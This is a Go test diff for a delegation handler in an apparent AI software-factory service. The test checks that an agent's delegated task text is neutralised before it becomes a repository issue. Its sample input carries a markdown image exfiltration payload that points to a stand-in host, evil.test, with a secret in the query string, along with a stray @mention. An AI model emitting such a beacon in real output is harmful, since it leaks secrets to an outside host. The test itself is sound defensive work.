@@ -72,3 +72,32 @@ func TestDelegationFilesAChildWithADependency(t *testing.T) {
 		t.Fatalf("a done parent: %d", rr.Code)
 	}
 }
+
+// The delegated card's title and brief are the agent's: its issue carries
+// them as an escalation does, no mention and no link off the allowlist
+// live.
+func TestDelegationNeutralisesTheAgentsText(t *testing.T) {
+	rf := &rollForgejo{}
+	fj, _ := rf.srv(t)
+	fj.PublicURL = "https://git.example"
+	store := newFakeStore()
+	store.projects = []Project{seedProject("sf/ai-software-factory-code")}
+	if err := store.CreateTask(context.Background(), Task{ID: "t-parent", Status: "running", Repository: "sf/ai-software-factory-code", IssueNumber: 41}); err != nil {
+		t.Fatal(err)
+	}
+	h := DelegationHandler(DelegationDeps{Store: store, Forgejo: fj, Workflows: &fakeWorkflows{},
+		Budget: func() policy.Budget {
+			return policy.Budget{TaskDefaultEUR: 5, TaskMaxEUR: 15, DayEUR: 20, MonthEUR: 50}
+		}})
+	rr := httptest.NewRecorder()
+	h(rr, httptest.NewRequest(http.MethodPost, "/internal/delegations", strings.NewReader(
+		`{"task_id":"t-parent","title":"Add the index @mallory","brief":"See ![x](https://evil.test/p?d=s3cret) and https://git.example/sf/repo/issues/4."}`)))
+	if rr.Code != http.StatusCreated {
+		t.Fatalf("status %d: %s", rr.Code, rr.Body)
+	}
+	want := "Add the index ＠mallory\n\nDelegated by card #41 (t-parent): it starts when that card is done and builds on its merge.\n\n" +
+		"See ![x](hxxps://evil[.]test/p?d=s3cret) and https://git.example/sf/repo/issues/4.\n\nSize: small\nRung: cheap, delegated routine work"
+	if !slices.Equal(rf.issues, []string{want}) {
+		t.Fatalf("issues %q, want %q", rf.issues, want)
+	}
+}
